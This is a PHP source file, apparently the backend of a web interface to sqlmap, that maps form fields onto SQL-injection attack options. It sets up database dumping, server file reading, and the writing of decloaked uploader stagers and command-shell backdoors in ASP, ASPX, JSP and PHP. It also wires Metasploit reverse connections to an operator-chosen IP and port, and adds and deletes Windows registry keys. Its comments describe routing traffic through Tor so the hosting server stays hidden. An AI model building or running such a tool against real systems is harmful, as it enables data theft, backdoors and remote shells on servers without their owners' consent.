<?php

    $options_to_enable = array();
    $options_to_enable['url'] = trim($_POST['url']);
    $host_str = parse_url($options_to_enable['url'], PHP_URL_HOST);
    if ((isset($_POST['method'])) && (trim($_POST['method']) != "")) {
        $options_to_enable['method'] = trim($_POST['method']);
    }
    if ((isset($_POST['method'])) && (trim($_POST['method']) != "")
    && ((trim(strtolower($_POST['method'])) == "post") || (trim(strtolower($_POST['method'])) == "put"))) {
        if ((isset($_POST['data'])) && (trim($_POST['data']) != "")) {
            $options_to_enable['data'] = trim($_POST['data']);
        }
    }
    if ((isset($_POST['flushSession'])) && (trim(strtolower($_POST['flushSession'])) == "y")) {
        $options_to_enable['flushSession'] = 'true';
    }
    if ((isset($_POST['identifier'])) && (trim(strtolower($_POST['identifier'])) == "fuzz")) {
        if ((isset($_POST['testParameter'])) && (trim($_POST['testParameter']) != "")) {
            $options_to_enable['testParameter'] = trim($_POST['testParameter']);
        }
    }
    if ((isset($_POST['identifier'])) && (trim(strtolower($_POST['identifier'])) == "forms")) {
        $options_to_enable['forms'] = 'true';
    }
    if ((isset($_POST['skip'])) && (trim($_POST['skip']) != "")) {
        $options_to_enable['skip'] = trim($_POST['skip']);
    }
    if ((isset($_POST['delay'])) && ((int) $_POST['delay'] > 0)) {
        $options_to_enable['delay'] = (int) $_POST['delay'];
    }
    if ((isset($_POST['timeout'])) && ((int) $_POST['timeout'] > 0) && ((int) $_POST['timeout'] != 30)) {
        $options_to_enable['timeout'] = (int) $_POST['timeout'];
    }
    if ((isset($_POST['retries'])) && ((int) $_POST['retries'] > 0) && ((int) $_POST['retries'] != 3)) {
        $options_to_enable['retries'] = (int) $_POST['retries'];
    }
    if ((isset($_POST['user_agent_type'])) && (trim($_POST['user_agent_type']) != "")) {
        switch (strtolower(trim($_POST['user_agent_type']))) {
        case "sqlmap":
          break;

        case "mobile":
          $options_to_enable['mobile'] = 'true';
          break;

        case "custom":
          if ((isset($_POST['user_agent'])) && (trim($_POST['user_agent']) != "")) {
              $options_to_enable['agent'] = trim($_POST['user_agent']);
          } else {
              $options_to_enable['randomAgent'] = 'true';
          }
          break;

        default:
          $options_to_enable['randomAgent'] = 'true';
          break;
      }
    } else {
        $options_to_enable['randomAgent'] = 'true';
    }
    if ((isset($_POST['host_support'])) && (trim(strtolower($_POST['host_support'])) == "enabled")) {
        if ((isset($_POST['host'])) && (trim($_POST['host']) != "")) {
            $options_to_enable['host'] = trim($_POST['host']);
        }
    }
    if ((isset($_POST['cookie_support'])) && (trim(strtolower($_POST['cookie_support'])) == "enabled")) {
        if ((isset($_POST['cookie'])) && (trim($_POST['cookie']) != "")) {
            $options_to_enable['cookie'] = trim($_POST['cookie']);
        }
    }
    if ((isset($_POST['referer_support'])) && (trim(strtolower($_POST['referer_support'])) == "enabled")) {
        if ((isset($_POST['referer'])) && (trim($_POST['referer']) != "")) {
            $options_to_enable['referer'] = trim($_POST['referer']);
        }
    }

    if ((isset($_POST['header_support'])) && (trim(strtolower($_POST['header_support'])) == "enabled")) {
        if ((isset($_POST['headers'])) && (trim($_POST['headers']) != "")) {
            $options_to_enable['headers'] = trim($_POST['headers']);
        }
    }
    if ((isset($_POST['authType'])) && (trim($_POST['authType']) != "")) {
        $options_to_enable['authType'] = trim($_POST['authType']);
        $options_to_enable['authCred'] = trim($_POST['auth_username']) . ':' . trim($_POST['auth_password']);
    }
    if ((isset($_POST['request_prefix'])) && (trim(strtolower($_POST['request_prefix'])) == "enabled")) {
        if ((isset($_POST['prefix'])) && (trim($_POST['prefix']) != "")) {
            $options_to_enable['prefix'] = trim($_POST['prefix']);
        }
    }
    if ((isset($_POST['request_suffix'])) && (trim(strtolower($_POST['request_suffix'])) == "enabled")) {
        if ((isset($_POST['suffix'])) && (trim($_POST['suffix']) != "")) {
            $options_to_enable['suffix'] = trim($_POST['suffix']);
        }
    }
    if ((isset($_POST['request_invalidator'])) && (trim($_POST['request_invalidator']) != "")) {
        switch (trim($_POST['request_invalidator'])) {
        case "invalidBignum":
          $options_to_enable['invalidBignum'] = 'true';
          break;

        case "invalidLogical":
          $options_to_enable['invalidLogical'] = 'true';
          break;

        case "invalidString":
          $options_to_enable['invalidString'] = 'true';
          break;

        default:
          break;
      }
    }
    if ((isset($_POST['noCast'])) && (trim($_POST['noCast']) != "")) {
        $options_to_enable['noCast'] = 'true';
    }
    if ((isset($_POST['hexConvert'])) && (trim($_POST['hexConvert']) != "")) {
        $options_to_enable['hexConvert'] = 'true';
    }
    if ((isset($_POST['hpp'])) && (trim($_POST['hpp']) != "")) {
        $options_to_enable['hpp'] = 'true';
    }
    if ((isset($_POST['timeSec'])) && ((int) $_POST['timeSec'] > 0) && ((int) $_POST['timeSec'] != 5)) {
        $options_to_enable['timeSec'] = (int) $_POST['timeSec'];
    }
    if ((isset($_POST['union_col_range'])) && (trim(strtolower($_POST['union_col_range'])) == "enabled")) {
        if ((isset($_POST['union_col_min'])) && ((int) $_POST['union_col_min'] > 0)
      && (isset($_POST['union_col_max'])) && ((int) $_POST['union_col_max'] > 0)
      && ((int) $_POST['union_col_max'] > (int) $_POST['union_col_min'])) {
            $options_to_enable['uCols'] = $_POST['union_col_min'] . '-' . $_POST['union_col_max'];
        }
    }
    if ((isset($_POST['union_char_filter'])) && (trim(strtolower($_POST['union_char_filter'])) == "enabled")) {
        if ((isset($_POST['uChar'])) && (trim($_POST['uChar']) != "")) {
            $options_to_enable['uChar'] = trim($_POST['uChar']);
        }
    }
    if ((isset($_POST['union_from_filter'])) && (trim(strtolower($_POST['union_from_filter'])) == "enabled")) {
        if ((isset($_POST['uFrom'])) && (trim($_POST['uFrom']) != "")) {
            $options_to_enable['uFrom'] = trim($_POST['uFrom']);
        }
    }

    if ((isset($_POST['tech'])) && (sizeof($_POST['tech']) > 0)) {
        if (in_array("A", $_POST['tech'])) {
            $options_to_enable['tech'] = "BEUSTQ";
        } else {
            $options_to_enable['tech'] = strtoupper(implode("", $_POST['tech']));
        }
    } else {
        $options_to_enable['tech'] = "BEUSTQ";
    }
    if ((isset($_POST['threads'])) && ((int) $_POST['threads'] > 1)) {
        $options_to_enable['threads'] = (int) $_POST['threads'];
    }
    if ((isset($_POST['dbms'])) && (trim($_POST['dbms']) != "")) {
        $options_to_enable['dbms'] = trim($_POST['dbms']);
    }
    if ((isset($_POST['os'])) && (trim($_POST['os']) != "")) {
        $options_to_enable['os'] = trim($_POST['os']);
    }
    if ((isset($_POST['tamper'])) && (sizeof($_POST['tamper']) > 0)) {
        $options_to_enable['tamper'] = implode(",", $_POST['tamper']);
    }
    if ((isset($_POST['textOnly'])) && (trim(strtolower($_POST['textOnly'])) == "enabled")) {
        $options_to_enable['textOnly'] = 'true';
    }
    if ((isset($_POST['titles'])) && (trim(strtolower($_POST['titles'])) == "enabled")) {
        $options_to_enable['titles'] = 'true';
    }
    if ((isset($_POST['comaprison_code'])) && (trim(strtolower($_POST['comaprison_code'])) == "enabled")) {
        $options_to_enable['code'] = trim($_POST['request_comaprison_code']);
    }
    if ((isset($_POST['comaprison_str'])) && (trim(strtolower($_POST['comaprison_str'])) == "enabled")) {
        $options_to_enable['string'] = trim($_POST['request_comaprison_str']);
    }
    if ((isset($_POST['comaprison_not_str'])) && (trim(strtolower($_POST['comaprison_not_str'])) == "enabled")) {
        $options_to_enable['notString'] = trim($_POST['request_comaprison_not_str']);
    }
    if ((isset($_POST['comaprison_regexp'])) && (trim(strtolower($_POST['comaprison_regexp'])) == "enabled")) {
        $options_to_enable['regexp'] = trim($_POST['request_comaprison_regex_str']);
    }
    if ((isset($_POST['db'])) && (trim($_POST['db']) != "")) {
        $options_to_enable['db'] = trim($_POST['db']);
    }
    if ((isset($_POST['tbl'])) && (trim($_POST['tbl']) != "")) {
        $options_to_enable['tbl'] = trim($_POST['tbl']);
    }
    if ((isset($_POST['col'])) && (trim($_POST['col']) != "")) {
        $options_to_enable['col'] = trim($_POST['col']);
    }
    if ((isset($_POST['excludeCol'])) && (trim($_POST['excludeCol']) != "")) {
        $options_to_enable['excludeCol'] = trim($_POST['excludeCol']);
    }
    if ((isset($_POST['user'])) && (trim($_POST['user']) != "")) {
        $options_to_enable['user'] = trim($_POST['user']);
    }
    if ((isset($_POST['dumpWhere'])) && (trim($_POST['dumpWhere']) != "")) {
        $options_to_enable['dumpWhere'] = trim($_POST['dumpWhere']);
    }
    if ((isset($_POST['enum_sql_query'])) && (trim($_POST['enum_sql_query']) != "")) {
        $options_to_enable['query'] = trim($_POST['enum_sql_query']);
    }
    if ((isset($_POST['limitStart'])) && (trim($_POST['limitStart']) != "") && ((int) $_POST['limitStart'] >= 0)) {
        $options_to_enable['limitStart'] = trim($_POST['limitStart']);
    }
    if ((isset($_POST['limitStop'])) && (trim($_POST['limitStop']) != "") && ((int) $_POST['limitStop'] > 0)) {
        $options_to_enable['limitStop'] = trim($_POST['limitStop']);
    }
    if ((isset($_POST['enum_options'])) && (sizeof($_POST['enum_options']) > 0)) {
        foreach ($_POST['enum_options'] as $opt) {
            if ((preg_match("#evalcode|tor|proxy|purgeOutput|saveCmdline#i", $opt))) {
                // evalCode => You can choose to enable this on YOUR server if you like, but opens up RCE vector for user if enabled....
                // tor => Running all requests over tor to keep server hidden, don't want users to disable this to find our host!
                // proxy => Running on server and over tor, we don't need to enable any additional proxying of requests here...
                // purgeOutput => We don't need users deleting shit on us now, schedule regular cleanup via cron or remove everything at end of session...
                continue;
            } else {
                $options_to_enable[$opt] = 'true';
                if ($opt == "search") {
                    if (isset($options_to_enable['answers'])) {
                        $options_to_enable['answers'] .= ",consider=1,dump=n";
                    } else {
                        $options_to_enable['answers'] = "consider=1,dump=n";
                    }
                }
            }
        }
    }
    if ((isset($_POST['rFile'])) && (trim($_POST['file_privs']) == "r") && (trim($_POST['rFile']) != "")) {
        $options_to_enable['rFile'] = trim($_POST['rFile']);
    }
    if ((isset($_POST['file_privs'])) && (trim($_POST['file_privs']) == "w") && (trim($_POST['dFile']) != "")) {
        $options_to_enable['dFile'] = trim($_POST['dFile']);
        switch (trim($_POST['file_write'])) {
        case "revShell":
          switch (trim($_POST['cmdShellLang'])) {
            case "1": // ASP
              break;

            case "2": // ASPX
              break;

            case "3": // JSP
              break;

            default:  // PHP
              break;
          }
          break;

        case "uploader":
          switch (trim($_POST['cmdShellLang'])) {
            case "1": // ASP
              copy(SQLMAP_BIN_PATH . "shell/stager.asp_", TMP_PATH . "stager.asp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.asp_");
              chmod(TMP_PATH . "stager.asp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.asp";
              break;

            case "2": // ASPX
              copy(SQLMAP_BIN_PATH . "shell/stager.aspx_", TMP_PATH . "stager.aspx_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.aspx_");
              chmod(TMP_PATH . "stager.aspx", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.aspx";
              break;

            case "3": // JSP
              copy(SQLMAP_BIN_PATH . "shell/stager.jsp_", TMP_PATH . "stager.jsp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.jsp_");
              chmod(TMP_PATH . "stager.jsp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.jsp";
              break;

            default:  // PHP
              copy(SQLMAP_BIN_PATH . "shell/stager.php_", TMP_PATH . "stager.php_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "stager.php_");
              chmod(TMP_PATH . "stager.php", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "stager.php";
              break;
          }
          break;

        default: // cmdShell
          switch (trim($_POST['cmdShellLang'])) {
            case "1": // ASP
              copy(SQLMAP_BIN_PATH . "shell/backdoor.asp_", TMP_PATH . "backdoor.asp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.asp_");
              chmod(TMP_PATH . "backdoor.asp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.asp";
              break;

            case "2": // ASPX
              copy(SQLMAP_BIN_PATH . "shell/backdoor.aspx_", TMP_PATH . "backdoor.aspx_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.aspx_");
              chmod(TMP_PATH . "backdoor.aspx", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.aspx";
              break;

            case "3": // JSP
              copy(SQLMAP_BIN_PATH . "shell/backdoor.jsp_", TMP_PATH . "backdoor.jsp_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.jsp_");
              chmod(TMP_PATH . "backdoor.jsp", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.jsp";
              break;

            default:  // PHP
              copy(SQLMAP_BIN_PATH . "shell/backdoor.php_", TMP_PATH . "backdoor.php_");
              shell_exec("cd " . TMP_PATH . " && python " . SQLMAP_BIN_PATH . "extra/cloak/cloak.py -d -i " . TMP_PATH . "backdoor.php_");
              chmod(TMP_PATH . "backdoor.php", 0644);
              $options_to_enable['wFile'] = TMP_PATH . "backdoor.php";
              break;
          }
          break;
      }
    }
    // osCmd
    if ((isset($_POST['osCmd'])) && (trim($_POST['os_privs']) == "r") && (trim($_POST['osCmd']) != "")) {
        $options_to_enable['osCmd'] = trim($_POST['osCmd']);
        if ((isset($_POST['os_cmd_dFile'])) && (trim($_POST['cmdShellLang']) != "")) {
            if (isset($options_to_enable['answers'])) {
                $options_to_enable['answers'] .= ",language=".$_POST['cmdShellLang'].",writable=2,absolute=".trim($_POST['os_cmd_dFile'])."";
            } else {
                $options_to_enable['answers'] = "language=".$_POST['cmdShellLang'].",writable=2,absolute=".trim($_POST['os_cmd_dFile'])."";
            }
        }
    }
    // osPwn
    if ((isset($_POST['os_privs'])) && (trim($_POST['os_privs']) == "p")) {
        if ((isset($_POST['osPwn_tmpPath'])) && (trim($_POST['osPwn_tmpPath']) != "")) {
            $options_to_enable['tmpPath'] = trim($_POST['osPwn_tmpPath']);
        }
        if ((isset($_POST['osPwn_ip'])) && (trim($_POST['osPwn_ip']) != "") && (isset($_POST['osPwn_port']))) {
            if (($_POST['osPwn_port'] > 0) && ($_POST['osPwn_port'] < 65535)) {
                $osPwn_port = $_POST['osPwn_port'];
            } else {
                $osPwn_port = '4444';
            }
            $osPwn_ip = trim($_POST['osPwn_ip']);
            if ((isset($_POST['meterpreter_type'])) && ($_POST['meterpreter_type'] > 0) && ($_POST['meterpreter_type'] < 5)) {
                $osPwn_type = $_POST['osPwn_port'];
            } else {
                $osPwn_type = '1';
            }
            if (isset($options_to_enable['answers'])) {
                $options_to_enable['answers'] .= ",tunnel=1,connection=$osPwn_type,address=$osPwn_ip,port=$osPwn_port,remove=y";
            } else {
                $options_to_enable['answers'] = "tunnel=1,connection=$osPwn_type,address=$osPwn_ip,port=$osPwn_port,remove=y";
            }
            $options_to_enable['osPwn'] = 'true';
        }
    }

    $options_to_enable['msfPath'] = MSF_PATH;  // MSF Path for osX advanced attacks



    if ((isset($_POST['win_reg'])) && (trim($_POST['win_reg']) != "")) {
        if ((isset($_POST['regKey'])) && (trim($_POST['regKey']) != "")) {
            $options_to_enable['regKey'] = addslashes(trim($_POST['regKey']));
        }
        if ((isset($_POST['regVal'])) && (trim($_POST['regVal']) != "")) {
            $options_to_enable['regVal'] = trim($_POST['regVal']);
        }
        if ((isset($_POST['regType'])) && (trim($_POST['regType']) != "")) {
            $options_to_enable['regType'] = trim($_POST['regType']);
        }
        if ((isset($_POST['regData'])) && (trim($_POST['regData']) != "")) {
            $options_to_enable['regData'] = trim($_POST['regData']);
        }
        switch (trim(strtoupper($_POST['win_reg']))) {
        case "A":
          $options_to_enable['regAdd'] = 'true';
          break;

        case "D":
          $options_to_enable['regDel'] = 'true';
          break;

        default:
          $options_to_enable['regRead'] = 'true';
          if (isset($options_to_enable['answers'])) {
              $options_to_enable['answers'] .= ",extending=y,vulnerable=N,optimize=Y,ProductName=epicFailure,Visual=Y,debug=Y";
          } else {
              $options_to_enable['answers'] = "extending=y,vulnerable=N,optimize=Y,ProductName=epicFailure,Visual=Y,debug=Y";
          }
          break;
      }
    }
